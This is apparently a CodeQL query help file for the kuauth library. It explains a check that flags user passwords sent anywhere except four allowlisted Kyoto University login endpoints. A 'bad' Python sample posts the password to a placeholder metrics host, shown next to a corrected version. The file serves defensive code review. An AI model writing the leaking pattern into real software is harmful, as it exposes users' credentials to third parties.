<!DOCTYPE qhelp PUBLIC
  "-//Semmle//qhelp//EN"
  "qhelp.dtd">
<qhelp>
<overview>
<p>A credential value originating from <code>KyotoUAuth</code> flows into
an outbound <code>httpx</code> request whose enclosing function is not
on the allowlist of legitimate IdP / CAS form submitters. The kuauth
library MUST send the user's password to exactly one of:</p>

<ul>
  <li><code>auth.iimc.kyoto-u.ac.jp/pub/login.cgi</code></li>
  <li><code>auth.iimc.kyoto-u.ac.jp/pub/otplogin.cgi</code></li>
  <li><code>authidp1.iimc.kyoto-u.ac.jp/.../j_security_check</code></li>
  <li><code>panda.ecs.kyoto-u.ac.jp/cas/login</code></li>
</ul>

<p>Any other outbound request that carries a credential is treated as
exfiltration, regardless of intent (telemetry, debug capture, retry, etc.).</p>
</overview>

<recommendation>
<p>If you are intentionally adding a fifth IdP / CAS endpoint, register
the new submitter function name in <code>KuauthAllowedHosts.qll</code>
so that this query continues to recognize it as legitimate. Adding a
host to the allowlist requires explicit code review by the maintainer
of the library — the failure mode of forgetting is a noisy CI alert,
which is the desired direction for a credential-handling library.</p>

<p>If the flagged call is an instrumentation hook (logging, metrics,
HAR capture), redact the credential before the call.</p>
</recommendation>

<example>
<p>Bad — credentials sent to a metrics endpoint:</p>
<sample language="python">
self.http.post(
    "https://metrics.example.com/auth-events",
    json={"user": self._auth.username, "pw_len": len(self._auth._password),
          "pw": self._auth._password},  # leaks
)
</sample>

<p>Good — only metadata in the body:</p>
<sample language="python">
self.http.post(
    "https://metrics.example.com/auth-events",
    json={"user": self._auth.username, "pw_len": len(self._auth._password)},
)
</sample>
</example>

<references>
<li>CWE-201: Insertion of Sensitive Information Into Sent Data
(<a href="https://cwe.mitre.org/data/definitions/201.html">cwe.mitre.org/201</a>).</li>
<li>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
(<a href="https://cwe.mitre.org/data/definitions/200.html">cwe.mitre.org/200</a>).</li>
</references>
</qhelp>
